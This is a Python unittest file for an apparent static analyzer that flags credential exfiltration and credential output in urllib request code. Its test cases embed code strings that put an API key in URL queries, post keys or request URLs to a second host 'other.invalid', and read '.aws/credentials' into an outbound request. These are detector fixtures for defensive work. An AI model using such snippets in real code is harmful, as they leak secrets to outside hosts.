"""Request construction preserves query purpose and raw URL exposure separately."""
import unittest
from test_qindun_certify import MODULE


class PythonUrllibQueryAuthTests(unittest.TestCase):
    def test_request_transport_and_metadata(self):
        cases = [
            ("direct_urlopen", "import os,requests,urllib.request\nkey=os.getenv(\"API_KEY\")\nurllib.request.urlopen(f\"https://service.invalid/api?key={key}\")", ["candidate"], False),
            ("inline_request", "import os,requests,urllib.request\nkey=os.getenv(\"API_KEY\")\nurllib.request.urlopen(urllib.request.Request(f\"https://service.invalid/api?key={key}\"))", ["candidate"], False),
            ("bound_request", "import os,requests,urllib.request\nkey=os.getenv(\"API_KEY\")\nreq=urllib.request.Request(f\"https://service.invalid/api?key={key}\")\nurllib.request.urlopen(req)", ["candidate"], False),
            ("keyword_request", "import os,requests,urllib.request\nkey=os.getenv(\"API_KEY\")\nreq=urllib.request.Request(url=f\"https://service.invalid/api?key={key}\")\nurllib.request.urlopen(req)", ["candidate"], False),
            ("literal_format_request", "import os,requests,urllib.request\nkey=os.getenv(\"API_KEY\")\nreq=urllib.request.Request(\"https://service.invalid/api?key={}\".format(key))\nurllib.request.urlopen(req)", ["candidate"], False),
            ("helper_request", "import os,requests,urllib.request\nkey=os.getenv(\"API_KEY\")\ndef fetch(key):\n    req=urllib.request.Request(f\"https://service.invalid/api?key={key}\")\n    return urllib.request.urlopen(req)\nfetch(key)", ["candidate"], False),
            ("request_url_log", "import os,requests,urllib.request\nkey=os.getenv(\"API_KEY\")\nreq=urllib.request.Request(f\"https://service.invalid/api?key={key}\")\nurllib.request.urlopen(req)\nprint(req.full_url)", ["candidate"], True),
            ("mixed_request_body", "import os,requests,urllib.request\nkey=os.getenv(\"API_KEY\")\nreq=urllib.request.Request(f\"https://service.invalid/api?key={key}\",data=key)\nurllib.request.urlopen(req)", ["confirmed"], False),
            ("mixed_file_sink", "import os,requests,urllib.request\nkey=os.getenv(\"API_KEY\")\nreq=urllib.request.Request(f\"https://service.invalid/api?key={key}\")\nurllib.request.urlopen(req)\nrequests.post(\"https://other.invalid\",data=key)", ["candidate","confirmed"], False),
            ("credential_file_query", "import os,requests,urllib.request\nkey=os.getenv(\"API_KEY\")\nkey=open(\".aws/credentials\").read()\nreq=urllib.request.Request(f\"https://service.invalid/api?key={key}\")\nurllib.request.urlopen(req)", ["confirmed"], False),
            ("mapping_query", "import os,requests,urllib.request\nkey=os.getenv(\"API_KEY\")\nkey={\"value\":key}\nreq=urllib.request.Request(f\"https://service.invalid/api?key={key}\")\nurllib.request.urlopen(req)", ["confirmed"], False),
            ("dynamic_authority", "import os,requests,urllib.request\nkey=os.getenv(\"API_KEY\")\nreq=urllib.request.Request(f\"https://{host}/api?key={key}\")\nurllib.request.urlopen(req)", ["confirmed"], False),
            ("request_sent_as_body", "import os,requests,urllib.request\nkey=os.getenv(\"API_KEY\")\nreq=urllib.request.Request(f\"https://service.invalid/api?key={key}\")\nrequests.post(\"https://other.invalid\",data=req)", ["confirmed"], False),
            ("request_url_sent_as_body", "import os,requests,urllib.request\nkey=os.getenv(\"API_KEY\")\nreq=urllib.request.Request(f\"https://service.invalid/api?key={key}\")\nrequests.post(\"https://other.invalid\",data=req.full_url)", ["confirmed"], False),
            ("response_url_log", "import os,requests,urllib.request\nkey=os.getenv(\"API_KEY\")\nreq=urllib.request.Request(f\"https://service.invalid/api?key={key}\")\nresponse=urllib.request.urlopen(req)\nprint(response.url)", ["candidate"], True),
            ("helper_response_url_log", "import os,requests,urllib.request\nkey=os.getenv(\"API_KEY\")\ndef fetch(key):\n    return urllib.request.urlopen(urllib.request.Request(f\"https://service.invalid/api?key={key}\"))\nresponse=fetch(key)\nprint(response.url)", ["candidate"], True),
            ("response_body_is_data", "import os,requests,urllib.request\nkey=os.getenv(\"API_KEY\")\nreq=urllib.request.Request(f\"https://service.invalid/api?key={key}\")\nresponse=urllib.request.urlopen(req)\nprint(response.read())", ["candidate"], False),
            ("header_auth_not_response_url", "import os,requests,urllib.request\nkey=os.getenv(\"API_KEY\")\nreq=urllib.request.Request(\"https://service.invalid\",headers={\"X-API-Key\":key})\nresponse=urllib.request.urlopen(req)\nprint(response.url)", ["candidate"], False),
            ("response_url_sent_as_body", "import os,requests,urllib.request\nkey=os.getenv(\"API_KEY\")\nreq=urllib.request.Request(f\"https://service.invalid/api?key={key}\")\nresponse=urllib.request.urlopen(req)\nrequests.post(\"https://other.invalid\",data=response.url)", ["candidate","confirmed"], False),
        ]
        for name, source, expected, output in cases:
            with self.subTest(name=name):
                hits, error = MODULE._python_flow_findings("main.py", source)
                self.assertIsNone(error)
                self.assertEqual(
                    sorted({h.disposition for h in hits
                            if h.rule_id == "QINDUN.D3.CREDENTIAL_EXFILTRATION"}),
                    expected,
                )
                self.assertEqual(
                    any(h.rule_id == "QINDUN.D5.CREDENTIAL_OUTPUT" for h in hits), output
                )

